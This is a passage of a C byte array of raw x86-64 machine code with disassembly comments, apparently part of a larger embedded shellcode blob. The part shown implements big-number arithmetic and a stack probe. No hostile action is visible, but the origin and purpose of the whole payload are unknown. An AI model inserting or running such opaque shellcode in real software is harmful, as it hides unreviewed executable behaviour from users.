  /* 199C */ "\x48\x8d\x34\x24"                         /* lea rsi, [rsp]                     */
  /* 19A0 */ "\x49\x8b\xf9"                             /* mov rdi, r9                        */
  /* 19A3 */ "\x49\x8b\xcb"                             /* mov rcx, r11                       */
  /* 19A6 */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 19A8 */ "\x48\x8b\xb4\x24\x10\x20\x00\x00"         /* mov rsi, [rsp+0x2010]              */
  /* 19B0 */ "\x48\x81\xc4\x00\x20\x00\x00"             /* add rsp, 0x2000                    */
  /* 19B7 */ "\x5f"                                     /* pop rdi                            */
  /* 19B8 */ "\xc3"                                     /* ret                                */
  /* 19B9 */ "\xcc"                                     /* int3                               */
  /* 19BA */ "\xcc"                                     /* int3                               */
  /* 19BB */ "\xcc"                                     /* int3                               */
  /* 19BC */ "\x48\x89\x74\x24\x08"                     /* mov [rsp+0x8], rsi                 */
  /* 19C1 */ "\x57"                                     /* push rdi                           */
  /* 19C2 */ "\xb8\x00\x20\x00\x00"                     /* mov eax, 0x2000                    */
  /* 19C7 */ "\xe8\x14\x03\x00\x00"                     /* call 0x1ce0                        */
  /* 19CC */ "\x48\x2b\xe0"                             /* sub rsp, rax                       */
  /* 19CF */ "\x4c\x8b\xc9"                             /* mov r9, rcx                        */
  /* 19D2 */ "\x4c\x8b\xd2"                             /* mov r10, rdx                       */
  /* 19D5 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 19D7 */ "\x41\xbb\x04\x04\x00\x00"                 /* mov r11d, 0x404                    */
  /* 19DD */ "\x48\x8d\x3c\x24"                         /* lea rdi, [rsp]                     */
  /* 19E1 */ "\x48\x8d\x34\x24"                         /* lea rsi, [rsp]                     */
  /* 19E5 */ "\x41\x8b\xcb"                             /* mov ecx, r11d                      */
  /* 19E8 */ "\x33\xd2"                                 /* xor edx, edx                       */
  /* 19EA */ "\x4d\x2b\xd0"                             /* sub r10, r8                        */
  /* 19ED */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 19EF */ "\xbf\x00\x01\x00\x00"                     /* mov edi, 0x100                     */
  /* 19F4 */ "\x49\x2b\xf0"                             /* sub rsi, r8                        */
  /* 19F7 */ "\x43\x8b\x0c\x02"                         /* mov ecx, [r10+r8]                  */
  /* 19FB */ "\x85\xd2"                                 /* test edx, edx                      */
  /* 19FD */ "\x74\x12"                                 /* jz 0x1a11                          */
  /* 19FF */ "\x33\xd2"                                 /* xor edx, edx                       */
  /* 1A01 */ "\x41\x3b\x08"                             /* cmp ecx, [r8]                      */
  /* 1A04 */ "\x0f\x96\xc2"                             /* setbe dl                           */
  /* 1A07 */ "\x83\xc8\xff"                             /* or eax, 0xffffffff                 */
  /* 1A0A */ "\x41\x2b\x00"                             /* sub eax, [r8]                      */
  /* 1A0D */ "\x03\xc8"                                 /* add ecx, eax                       */
  /* 1A0F */ "\xeb\x0b"                                 /* jmp 0x1a1c                         */
  /* 1A11 */ "\x33\xd2"                                 /* xor edx, edx                       */
  /* 1A13 */ "\x41\x3b\x08"                             /* cmp ecx, [r8]                      */
  /* 1A16 */ "\x0f\x92\xc2"                             /* setb dl                            */
  /* 1A19 */ "\x41\x2b\x08"                             /* sub ecx, [r8]                      */
  /* 1A1C */ "\x42\x89\x0c\x06"                         /* mov [rsi+r8], ecx                  */
  /* 1A20 */ "\x49\x83\xc0\x04"                         /* add r8, 0x4                        */
  /* 1A24 */ "\x48\xff\xcf"                             /* dec rdi                            */
  /* 1A27 */ "\x75\xce"                                 /* jnz 0x19f7                         */
  /* 1A29 */ "\x49\x8b\xf9"                             /* mov rdi, r9                        */
  /* 1A2C */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 1A2E */ "\x49\x8b\xcb"                             /* mov rcx, r11                       */
  /* 1A31 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1A33 */ "\x48\x8d\x34\x24"                         /* lea rsi, [rsp]                     */
  /* 1A37 */ "\x49\x8b\xf9"                             /* mov rdi, r9                        */
  /* 1A3A */ "\x49\x8b\xcb"                             /* mov rcx, r11                       */
  /* 1A3D */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 1A3F */ "\x48\x8b\xb4\x24\x10\x20\x00\x00"         /* mov rsi, [rsp+0x2010]              */
  /* 1A47 */ "\x48\x81\xc4\x00\x20\x00\x00"             /* add rsp, 0x2000                    */
  /* 1A4E */ "\x5f"                                     /* pop rdi                            */
  /* 1A4F */ "\xc3"                                     /* ret                                */
  /* 1A50 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 1A52 */ "\x41\xb9\xff\x00\x00\x00"                 /* mov r9d, 0xff                      */
  /* 1A58 */ "\x4c\x8d\x82\xfc\x03\x00\x00"             /* lea r8, [rdx+0x3fc]                */
  /* 1A5F */ "\x48\x2b\xca"                             /* sub rcx, rdx                       */
  /* 1A62 */ "\x42\x8b\x14\x01"                         /* mov edx, [rcx+r8]                  */
  /* 1A66 */ "\x45\x8b\x10"                             /* mov r10d, [r8]                     */
  /* 1A69 */ "\x44\x3b\xd2"                             /* cmp r10d, edx                      */
  /* 1A6C */ "\x75\x0b"                                 /* jnz 0x1a79                         */
  /* 1A6E */ "\x49\x83\xe8\x04"                         /* sub r8, 0x4                        */
  /* 1A72 */ "\x49\xff\xc9"                             /* dec r9                             */
  /* 1A75 */ "\x79\xeb"                                 /* jns 0x1a62                         */
  /* 1A77 */ "\xf3\xc3"                                 /* repe ret                           */
  /* 1A79 */ "\x1b\xc0"                                 /* sbb eax, eax                       */
  /* 1A7B */ "\x83\xe0\x02"                             /* and eax, 0x2                       */
  /* 1A7E */ "\xff\xc8"                                 /* dec eax                            */
  /* 1A80 */ "\xc3"                                     /* ret                                */
  /* 1A81 */ "\xcc"                                     /* int3                               */
  /* 1A82 */ "\xcc"                                     /* int3                               */
  /* 1A83 */ "\xcc"                                     /* int3                               */
  /* 1A84 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 1A89 */ "\x57"                                     /* push rdi                           */
  /* 1A8A */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 1A8E */ "\x49\x8b\xf9"                             /* mov rdi, r9                        */
  /* 1A91 */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 1A94 */ "\xe8\x97\xfe\xff\xff"                     /* call 0x1930                        */
  /* 1A99 */ "\x48\x8b\xd7"                             /* mov rdx, rdi                       */
  /* 1A9C */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 1A9F */ "\xe8\xac\xff\xff\xff"                     /* call 0x1a50                        */
  /* 1AA4 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 1AA6 */ "\x78\x0e"                                 /* js 0x1ab6                          */
  /* 1AA8 */ "\x4c\x8b\xc7"                             /* mov r8, rdi                        */
  /* 1AAB */ "\x48\x8b\xd3"                             /* mov rdx, rbx                       */
  /* 1AAE */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 1AB1 */ "\xe8\x06\xff\xff\xff"                     /* call 0x19bc                        */
  /* 1AB6 */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 1ABB */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 1ABF */ "\x5f"                                     /* pop rdi                            */
  /* 1AC0 */ "\xc3"                                     /* ret                                */
  /* 1AC1 */ "\xcc"                                     /* int3                               */
  /* 1AC2 */ "\xcc"                                     /* int3                               */
  /* 1AC3 */ "\xcc"                                     /* int3                               */
  /* 1AC4 */ "\x48\x8b\xc4"                             /* mov rax, rsp                       */
  /* 1AC7 */ "\x48\x89\x58\x08"                         /* mov [rax+0x8], rbx                 */
  /* 1ACB */ "\x48\x89\x68\x10"                         /* mov [rax+0x10], rbp                */
  /* 1ACF */ "\x48\x89\x70\x18"                         /* mov [rax+0x18], rsi                */
  /* 1AD3 */ "\x48\x89\x78\x20"                         /* mov [rax+0x20], rdi                */
  /* 1AD7 */ "\x41\x54"                                 /* push r12                           */
  /* 1AD9 */ "\x41\x55"                                 /* push r13                           */
  /* 1ADB */ "\x41\x56"                                 /* push r14                           */
  /* 1ADD */ "\xb8\x20\x40\x00\x00"                     /* mov eax, 0x4020                    */
  /* 1AE2 */ "\xe8\xf9\x01\x00\x00"                     /* call 0x1ce0                        */
  /* 1AE7 */ "\x48\x2b\xe0"                             /* sub rsp, rax                       */
  /* 1AEA */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 1AED */ "\x49\x8b\xc8"                             /* mov rcx, r8                        */
  /* 1AF0 */ "\x49\x8b\xe9"                             /* mov rbp, r9                        */
  /* 1AF3 */ "\x4d\x8b\xe0"                             /* mov r12, r8                        */
  /* 1AF6 */ "\x48\x8b\xf2"                             /* mov rsi, rdx                       */
  /* 1AF9 */ "\xe8\xf2\xfd\xff\xff"                     /* call 0x18f0                        */
  /* 1AFE */ "\x41\xbe\x04\x04\x00\x00"                 /* mov r14d, 0x404                    */
  /* 1B04 */ "\x44\x8b\xe8"                             /* mov r13d, eax                      */
  /* 1B07 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 1B09 */ "\x48\x8d\xbc\x24\x20\x20\x00\x00"         /* lea rdi, [rsp+0x2020]              */
  /* 1B11 */ "\x41\x8b\xce"                             /* mov ecx, r14d                      */
  /* 1B14 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1B16 */ "\x48\x8d\x7c\x24\x20"                     /* lea rdi, [rsp+0x20]                */
  /* 1B1B */ "\x41\x8b\xce"                             /* mov ecx, r14d                      */
  /* 1B1E */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1B20 */ "\x48\x8d\x7c\x24\x20"                     /* lea rdi, [rsp+0x20]                */
  /* 1B25 */ "\x41\x8b\xce"                             /* mov ecx, r14d                      */
  /* 1B28 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1B2A */ "\x48\x8d\x7c\x24\x20"                     /* lea rdi, [rsp+0x20]                */
  /* 1B2F */ "\x41\x8b\xce"                             /* mov ecx, r14d                      */
  /* 1B32 */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 1B34 */ "\x33\xff"                                 /* xor edi, edi                       */
  /* 1B36 */ "\x45\x85\xed"                             /* test r13d, r13d                    */
  /* 1B39 */ "\x7e\x4f"                                 /* jle 0x1b8a                         */
  /* 1B3B */ "\x8b\xc7"                                 /* mov eax, edi                       */
  /* 1B3D */ "\x8b\xcf"                                 /* mov ecx, edi                       */
  /* 1B3F */ "\x48\xc1\xe8\x05"                         /* shr rax, 0x5                       */
  /* 1B43 */ "\x83\xe1\x1f"                             /* and ecx, 0x1f                      */
  /* 1B46 */ "\x41\x8b\x04\x84"                         /* mov eax, [r12+rax*4]               */
  /* 1B4A */ "\x0f\xa3\xc8"                             /* bt eax, ecx                        */
  /* 1B4D */ "\x73\x1d"                                 /* jae 0x1b6c                         */
  /* 1B4F */ "\x4c\x8d\x44\x24\x20"                     /* lea r8, [rsp+0x20]                 */
  /* 1B54 */ "\x48\x8d\x94\x24\x20\x20\x00\x00"         /* lea rdx, [rsp+0x2020]              */
  /* 1B5C */ "\x48\x8d\x8c\x24\x20\x20\x00\x00"         /* lea rcx, [rsp+0x2020]              */
  /* 1B64 */ "\x4c\x8b\xcd"                             /* mov r9, rbp                        */
  /* 1B67 */ "\xe8\x18\xff\xff\xff"                     /* call 0x1a84                        */
  /* 1B6C */ "\x4c\x8d\x44\x24\x20"                     /* lea r8, [rsp+0x20]                 */
  /* 1B71 */ "\x48\x8d\x54\x24\x20"                     /* lea rdx, [rsp+0x20]                */
  /* 1B76 */ "\x48\x8d\x4c\x24\x20"                     /* lea rcx, [rsp+0x20]                */
  /* 1B7B */ "\x4c\x8b\xcd"                             /* mov r9, rbp                        */
  /* 1B7E */ "\xe8\x01\xff\xff\xff"                     /* call 0x1a84                        */
  /* 1B83 */ "\xff\xc7"                                 /* inc edi                            */
  /* 1B85 */ "\x41\x3b\xfd"                             /* cmp edi, r13d                      */
  /* 1B88 */ "\x7c\xb1"                                 /* jl 0x1b3b                          */
  /* 1B8A */ "\x4c\x8d\x9c\x24\x20\x40\x00\x00"         /* lea r11, [rsp+0x4020]              */
  /* 1B92 */ "\x48\x8b\xfb"                             /* mov rdi, rbx                       */
  /* 1B95 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 1B97 */ "\x49\x8b\x6b\x28"                         /* mov rbp, [r11+0x28]                */
  /* 1B9B */ "\x49\x8b\xce"                             /* mov rcx, r14                       */
  /* 1B9E */ "\x48\x8d\xb4\x24\x20\x20\x00\x00"         /* lea rsi, [rsp+0x2020]              */
  /* 1BA6 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1BA8 */ "\x48\x8b\xfb"                             /* mov rdi, rbx                       */
  /* 1BAB */ "\x49\x8b\x5b\x20"                         /* mov rbx, [r11+0x20]                */
  /* 1BAF */ "\x49\x8b\xce"                             /* mov rcx, r14                       */
  /* 1BB2 */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 1BB4 */ "\x49\x8b\x73\x30"                         /* mov rsi, [r11+0x30]                */
  /* 1BB8 */ "\x49\x8b\x7b\x38"                         /* mov rdi, [r11+0x38]                */
  /* 1BBC */ "\x49\x8b\xe3"                             /* mov rsp, r11                       */
  /* 1BBF */ "\x41\x5e"                                 /* pop r14                            */
  /* 1BC1 */ "\x41\x5d"                                 /* pop r13                            */
  /* 1BC3 */ "\x41\x5c"                                 /* pop r12                            */
  /* 1BC5 */ "\xc3"                                     /* ret                                */
  /* 1BC6 */ "\xcc"                                     /* int3                               */
  /* 1BC7 */ "\xcc"                                     /* int3                               */
  /* 1BC8 */ "\x48\x8b\xc4"                             /* mov rax, rsp                       */
  /* 1BCB */ "\x48\x89\x58\x08"                         /* mov [rax+0x8], rbx                 */
  /* 1BCF */ "\x48\x89\x70\x10"                         /* mov [rax+0x10], rsi                */
  /* 1BD3 */ "\x48\x89\x78\x18"                         /* mov [rax+0x18], rdi                */
  /* 1BD7 */ "\x55"                                     /* push rbp                           */
  /* 1BD8 */ "\x41\x54"                                 /* push r12                           */
  /* 1BDA */ "\x41\x55"                                 /* push r13                           */
  /* 1BDC */ "\x41\x56"                                 /* push r14                           */
  /* 1BDE */ "\x41\x57"                                 /* push r15                           */
  /* 1BE0 */ "\x48\x8d\xa8\xb8\xc0\xff\xff"             /* lea rbp, [rax-0x3f48]              */
  /* 1BE7 */ "\xb8\x20\x40\x00\x00"                     /* mov eax, 0x4020                    */
  /* 1BEC */ "\xe8\xef\x00\x00\x00"                     /* call 0x1ce0                        */
  /* 1BF1 */ "\x48\x2b\xe0"                             /* sub rsp, rax                       */
  /* 1BF4 */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 1BF7 */ "\x49\x8b\xc8"                             /* mov rcx, r8                        */
  /* 1BFA */ "\x4d\x8b\xe1"                             /* mov r12, r9                        */
  /* 1BFD */ "\x4d\x8b\xe8"                             /* mov r13, r8                        */
  /* 1C00 */ "\x48\x8b\xf2"                             /* mov rsi, rdx                       */
  /* 1C03 */ "\xe8\xe8\xfc\xff\xff"                     /* call 0x18f0                        */
  /* 1C08 */ "\x41\xbf\x04\x04\x00\x00"                 /* mov r15d, 0x404                    */
  /* 1C0E */ "\x44\x8b\xf0"                             /* mov r14d, eax                      */
  /* 1C11 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 1C13 */ "\x48\x8d\xbd\x20\x1f\x00\x00"             /* lea rdi, [rbp+0x1f20]              */
  /* 1C1A */ "\x41\x8b\xcf"                             /* mov ecx, r15d                      */
  /* 1C1D */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1C1F */ "\x48\x8d\x7c\x24\x20"                     /* lea rdi, [rsp+0x20]                */
  /* 1C24 */ "\x41\x8b\xcf"                             /* mov ecx, r15d                      */
  /* 1C27 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1C29 */ "\x48\x8d\x7c\x24\x20"                     /* lea rdi, [rsp+0x20]                */
  /* 1C2E */ "\x41\x8b\xcf"                             /* mov ecx, r15d                      */
  /* 1C31 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1C33 */ "\x48\x8d\x7c\x24\x20"                     /* lea rdi, [rsp+0x20]                */
  /* 1C38 */ "\x41\x8b\xcf"                             /* mov ecx, r15d                      */
  /* 1C3B */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 1C3D */ "\x33\xff"                                 /* xor edi, edi                       */
  /* 1C3F */ "\xc7\x85\x20\x1f\x00\x00\x01\x00\x00\x00" /* mov dword [rbp+0x1f20], 0x1        */
  /* 1C49 */ "\x45\x85\xf6"                             /* test r14d, r14d                    */
  /* 1C4C */ "\x7e\x4e"                                 /* jle 0x1c9c                         */
  /* 1C4E */ "\x8b\xc7"                                 /* mov eax, edi                       */
  /* 1C50 */ "\x8b\xcf"                                 /* mov ecx, edi                       */
  /* 1C52 */ "\x48\xc1\xe8\x05"                         /* shr rax, 0x5                       */
  /* 1C56 */ "\x83\xe1\x1f"                             /* and ecx, 0x1f                      */
  /* 1C59 */ "\x41\x8b\x44\x85\x00"                     /* mov eax, [r13+rax*4]               */
  /* 1C5E */ "\x0f\xa3\xc8"                             /* bt eax, ecx                        */
  /* 1C61 */ "\x73\x1b"                                 /* jae 0x1c7e                         */
  /* 1C63 */ "\x4c\x8d\x44\x24\x20"                     /* lea r8, [rsp+0x20]                 */
  /* 1C68 */ "\x48\x8d\x95\x20\x1f\x00\x00"             /* lea rdx, [rbp+0x1f20]              */
  /* 1C6F */ "\x48\x8d\x8d\x20\x1f\x00\x00"             /* lea rcx, [rbp+0x1f20]              */
  /* 1C76 */ "\x4d\x8b\xcc"                             /* mov r9, r12                        */
  /* 1C79 */ "\xe8\x46\xfe\xff\xff"                     /* call 0x1ac4                        */
  /* 1C7E */ "\x4c\x8d\x44\x24\x20"                     /* lea r8, [rsp+0x20]                 */
  /* 1C83 */ "\x48\x8d\x54\x24\x20"                     /* lea rdx, [rsp+0x20]                */
  /* 1C88 */ "\x48\x8d\x4c\x24\x20"                     /* lea rcx, [rsp+0x20]                */
  /* 1C8D */ "\x4d\x8b\xcc"                             /* mov r9, r12                        */
  /* 1C90 */ "\xe8\x2f\xfe\xff\xff"                     /* call 0x1ac4                        */
  /* 1C95 */ "\xff\xc7"                                 /* inc edi                            */
  /* 1C97 */ "\x41\x3b\xfe"                             /* cmp edi, r14d                      */
  /* 1C9A */ "\x7c\xb2"                                 /* jl 0x1c4e                          */
  /* 1C9C */ "\x4c\x8d\x9c\x24\x20\x40\x00\x00"         /* lea r11, [rsp+0x4020]              */
  /* 1CA4 */ "\x48\x8b\xfb"                             /* mov rdi, rbx                       */
  /* 1CA7 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 1CA9 */ "\x49\x8b\xcf"                             /* mov rcx, r15                       */
  /* 1CAC */ "\x48\x8d\xb5\x20\x1f\x00\x00"             /* lea rsi, [rbp+0x1f20]              */
  /* 1CB3 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 1CB5 */ "\x48\x8b\xfb"                             /* mov rdi, rbx                       */
  /* 1CB8 */ "\x49\x8b\x5b\x30"                         /* mov rbx, [r11+0x30]                */
  /* 1CBC */ "\x49\x8b\xcf"                             /* mov rcx, r15                       */
  /* 1CBF */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 1CC1 */ "\x49\x8b\x73\x38"                         /* mov rsi, [r11+0x38]                */
  /* 1CC5 */ "\x49\x8b\x7b\x40"                         /* mov rdi, [r11+0x40]                */
  /* 1CC9 */ "\x49\x8b\xe3"                             /* mov rsp, r11                       */
  /* 1CCC */ "\x41\x5f"                                 /* pop r15                            */
  /* 1CCE */ "\x41\x5e"                                 /* pop r14                            */
  /* 1CD0 */ "\x41\x5d"                                 /* pop r13                            */
  /* 1CD2 */ "\x41\x5c"                                 /* pop r12                            */
  /* 1CD4 */ "\x5d"                                     /* pop rbp                            */
  /* 1CD5 */ "\xc3"                                     /* ret                                */
  /* 1CD6 */ "\xcc"                                     /* int3                               */
  /* 1CD7 */ "\xcc"                                     /* int3                               */
  /* 1CD8 */ "\xcc"                                     /* int3                               */
  /* 1CD9 */ "\xcc"                                     /* int3                               */
  /* 1CDA */ "\xcc"                                     /* int3                               */
  /* 1CDB */ "\xcc"                                     /* int3                               */
  /* 1CDC */ "\xcc"                                     /* int3                               */
  /* 1CDD */ "\xcc"                                     /* int3                               */
  /* 1CDE */ "\xcc"                                     /* int3                               */
  /* 1CDF */ "\xcc"                                     /* int3                               */
  /* 1CE0 */ "\x48\x83\xec\x10"                         /* sub rsp, 0x10                      */
  /* 1CE4 */ "\x4c\x89\x14\x24"                         /* mov [rsp], r10                     */
  /* 1CE8 */ "\x4c\x89\x5c\x24\x08"                     /* mov [rsp+0x8], r11                 */
  /* 1CED */ "\x4d\x31\xdb"                             /* xor r11, r11                       */
  /* 1CF0 */ "\x4c\x8d\x54\x24\x18"                     /* lea r10, [rsp+0x18]                */
  /* 1CF5 */ "\x49\x29\xc2"                             /* sub r10, rax                       */
  /* 1CF8 */ "\x4d\x0f\x42\xd3"                         /* cmovb r10, r11                     */
  /* 1CFC */ "\x65\x4c\x8b\x1c\x25\x10\x00\x00\x00"     /* mov r11, [gs:0x10]                 */
  /* 1D05 */ "\x4d\x39\xda"                             /* cmp r10, r11                       */
  /* 1D08 */ "\x73\x16"                                 /* jae 0x1d20                         */
  /* 1D0A */ "\x66\x41\x81\xe2\x00\xf0"                 /* and r10w, 0xf000                   */
  /* 1D10 */ "\x4d\x8d\x9b\x00\xf0\xff\xff"             /* lea r11, [r11-0x1000]              */
  /* 1D17 */ "\x41\xc6\x03\x00"                         /* mov byte [r11], 0x0                */
  /* 1D1B */ "\x4d\x39\xda"                             /* cmp r10, r11                       */
  /* 1D1E */ "\x75\xf0"                                 /* jnz 0x1d10                         */
  /* 1D20 */ "\x4c\x8b\x14\x24"                         /* mov r10, [rsp]                     */
  /* 1D24 */ "\x4c\x8b\x5c\x24\x08"                     /* mov r11, [rsp+0x8]                 */
  /* 1D29 */ "\x48\x83\xc4\x10"                         /* add rsp, 0x10                      */
  /* 1D2D */ "\xc3"                                     /* ret                                */
};